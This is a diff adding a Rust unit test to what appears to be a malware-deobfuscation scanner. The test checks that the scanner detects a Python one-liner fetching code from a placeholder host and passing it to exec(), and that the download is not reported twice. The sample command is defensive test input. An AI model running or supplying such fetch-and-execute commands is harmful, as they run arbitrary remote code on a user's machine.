@@ -15696,6 +15696,38 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn python_requests_bound_session_assigned_post_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; s = requests.Session(); send = s.post; exec(send('https://py.example/bound-session-assigned-post').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/bound-session-assigned-post" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned bound Session.post alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/bound-session-assigned-post")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python assigned bound Session.post alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_requests_module_alias_bound_session_get_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
